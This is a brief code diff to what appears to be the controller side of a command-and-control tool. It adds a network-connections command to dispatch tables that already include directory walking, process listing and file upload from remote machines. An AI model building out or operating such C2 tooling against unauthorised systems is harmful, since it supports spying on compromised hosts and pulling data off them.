@@ -38,6 +38,7 @@ c2_command_id_to_response_handler = {
     WALKDIR_COMMAND_ID: print_response,
     RUNNING_PROCESSES_COMMAND_ID: print_response,
     FILE_UPLOAD_COMMAND_ID: save_uploaded_file,
+    NETWORK_CONNECTIONS_COMMAND_ID: print_response,
 }
 
 
@@ -74,6 +75,7 @@ c2_command_id_to_request_handler = {
     WALKDIR_COMMAND_ID: get_path,
     RUNNING_PROCESSES_COMMAND_ID: no_arguments_required,
     FILE_UPLOAD_COMMAND_ID: get_path,
+    NETWORK_CONNECTIONS_COMMAND_ID: no_arguments_required,
 }
 
 
